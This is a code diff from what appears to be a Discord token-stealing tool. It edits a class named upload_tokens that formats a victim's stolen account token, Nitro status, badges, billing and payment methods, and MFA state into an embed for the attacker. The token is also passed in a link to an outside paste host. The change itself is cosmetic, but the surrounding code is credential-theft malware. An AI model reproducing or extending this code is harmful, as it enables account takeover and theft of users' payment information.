@@ -343,9 +343,9 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<:Among_Us_Black:1073744915932119151> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"```{nitro}```", inline=True)
-            embed.add_field(name="<a:BadgesRoll:1073745137445904434> Badges:", value=f"```{badges if badges != '' else 'None'}```", inline=True)
-            embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
+            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:BadgesRoll:1073745137445904434> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
             embed.add_field(name="<:SecuritySheild:1073745717073563678> MFA:", value=f"```{mfa}```", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
